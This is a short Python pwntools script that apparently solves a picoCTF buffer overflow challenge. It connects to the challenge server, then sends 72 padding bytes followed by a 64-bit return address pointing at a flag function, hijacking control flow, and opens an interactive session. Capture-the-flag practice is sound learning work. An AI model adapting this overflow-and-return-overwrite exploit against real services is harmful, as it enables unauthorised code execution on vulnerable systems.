from pwn import *

p = connect("saturn.picoctf.net", 55858)
#gdb.attach(p, gdbscript='break *vuln+19')
e = ELF('./vuln')

addr = 0x0040123b#e.symbols['flag']
print(hex(addr))
b = b''
b += b'A' * 64
b += b'C' * 8
b += p64(addr)
print(len(b))
p.sendline(b)
#print(p.recv())
p.interactive()
